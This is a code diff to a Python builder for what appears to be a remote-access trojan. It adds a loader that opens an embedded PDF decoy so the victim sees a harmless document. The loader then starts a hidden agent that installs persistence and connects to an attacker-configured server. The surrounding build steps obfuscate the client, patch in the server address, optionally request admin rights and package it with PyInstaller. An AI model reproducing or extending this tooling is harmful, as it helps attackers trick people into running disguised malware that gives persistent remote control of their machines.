@@ -65,6 +65,37 @@ exe = EXE(
 )
 """
 
+LOADER_TEMPLATE = """import os, sys, subprocess, asyncio, concurrent.futures
+
+# Open embedded PDF decoy
+try:
+    pdf = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
+    pdf = os.path.join(pdf, "{pdf_name}")
+    if os.path.exists(pdf):
+        if sys.platform == "win32":
+            os.startfile(pdf)
+        else:
+            subprocess.Popen(["xdg-open", pdf])
+except:
+    pass
+
+# Run agent
+from client import main, enhanced_install_persistence, check_lock_state
+enhanced_install_persistence()
+check_lock_state()
+_loop = asyncio.new_event_loop()
+asyncio.set_event_loop(_loop)
+_loop.set_default_executor(concurrent.futures.ThreadPoolExecutor(max_workers=16))
+try:
+    _loop.run_until_complete(main())
+finally:
+    try:
+        _loop.run_until_complete(_loop.shutdown_asyncgens())
+    except:
+        pass
+    _loop.close()
+"""
+
 
 def get_local_ips():
     ips = ["0.0.0.0", "127.0.0.1"]
@@ -112,14 +143,15 @@ class Manager:
         Path("client.py").write_text(src, encoding="utf-8")
         print(f"  [+] Patched client.py -> {self.config['server_ip']}:{self.config['server_port']}")
 
-    def generate_spec(self):
+    def generate_spec(self, entry_point="client.py"):
         datas = []
+        pdf_name = ""
         if self.config.get("use_pdf") and self.config.get("pdf_path"):
             pdf = self.config["pdf_path"]
             if os.path.exists(pdf):
-                sep = ";" if platform.system() == "Windows" else ":"
-                datas.append(f"{pdf}{sep}.")
-        datas_str = json.dumps(datas)
+                datas.append((pdf, "."))
+                pdf_name = os.path.basename(pdf)
+        datas_str = repr(datas)
 
         uac_line = ""
         if self.config["uac_admin"]:
@@ -129,7 +161,7 @@ class Manager:
             icon_line = f"icon=[r'{self.config['icon']}'],"
 
         spec = SPEC_TEMPLATE.format(
-            client_file="client.py",
+            client_file=entry_point,
             output_name=self.config["output_name"],
             datas=datas_str,
             upx=str(self.config["upx"]),
@@ -204,7 +236,17 @@ class Manager:
         print("\n--- Building Standalone Agent ---")
         self._obfuscate_client()
         self.patch_client()
-        spec = self.generate_spec()
+
+        entry = "client.py"
+        use_pdf = self.config.get("use_pdf") and self.config.get("pdf_path") and os.path.exists(self.config["pdf_path"])
+        if use_pdf:
+            pdf_name = os.path.basename(self.config["pdf_path"])
+            loader = LOADER_TEMPLATE.format(pdf_name=pdf_name)
+            Path("client_loader.py").write_text(loader)
+            entry = "client_loader.py"
+            print(f"  [+] Created client_loader.py (PDF: {pdf_name})")
+
+        spec = self.generate_spec(entry_point=entry)
 
         pyinst = self._find_pyinstaller()
         if not pyinst:
